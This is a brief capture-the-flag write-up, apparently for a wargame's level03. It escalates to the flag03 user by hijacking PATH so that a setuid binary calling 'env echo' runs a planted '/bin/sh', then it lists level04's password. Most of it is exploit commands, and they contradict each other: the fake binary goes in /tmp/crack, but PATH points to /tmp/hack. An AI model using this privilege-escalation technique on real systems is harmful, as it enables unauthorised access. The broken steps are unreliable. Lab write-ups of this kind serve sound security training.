when analyzing the executable, we see that it sets the program's id to effective user (flag03)
and that it executes "/usr/bin/env echo Exploit me" :

mkdir /tmp/crack
cd /tmp/crack
echo "/bin/sh" >echo
chmod +x echo
cd -
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/tmp/hack:/bin:/usr/games"
	(put /tmp/hack before /bin which is echo's path)
./level03

We are now logged in as flag03 and can do the getflag command
to get level04's password ("qi0maab88jeaj46qoumi7maus")
